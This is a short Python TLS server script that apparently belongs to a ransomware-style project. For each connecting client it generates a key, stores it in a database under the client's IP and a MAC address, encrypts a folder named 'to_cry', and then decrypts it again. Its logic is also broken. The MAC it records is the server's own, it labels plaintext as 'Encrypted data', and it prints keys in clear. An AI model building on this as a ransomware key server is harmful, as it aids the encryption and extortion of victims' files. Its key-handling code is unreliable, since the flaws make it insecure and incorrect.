import socket
import ssl
from secretkey import secret_key
import db
from folder_encryption import encrypt_folder
from folder_decryption import decrypt_folder
import uuid

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 12345))
server_socket.listen(5)

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="crt.pem", keyfile="key.pem")
ssl_socket = context.wrap_socket(server_socket, server_side=True)

while True:
    client_socket, client_address = ssl_socket.accept()
    print(f"there is a new connection from: {client_address}")

    data = client_socket.recv(1024).decode()
    print(f"client data: {data}")

    ip_address = client_address[0]
    mac_address = ":".join(
        ["{:02x}".format((uuid.getnode() >> i) & 0xFF) for i in range(0, 8 * 6, 8)][
            ::-1
        ]
    )

    key = secret_key()
    db.save_key(key, ip_address, mac_address)

    file_data = client_socket.recv(1024 * 1024)
    with open("received_file", "wb") as f:
        f.write(file_data)

    folder_to_encrypt = "to_cry"
    encrypt_folder(folder_to_encrypt, key)

    retrieved_key = db.get_key(ip_address, mac_address)

    decrypt_folder(folder_to_encrypt, retrieved_key)

    print(f"Key: {key}")
    print(f"Encrypted data: {data}")

    client_socket.sendall(b"File received and processed.")
    client_socket.close()


ssl_socket.close()
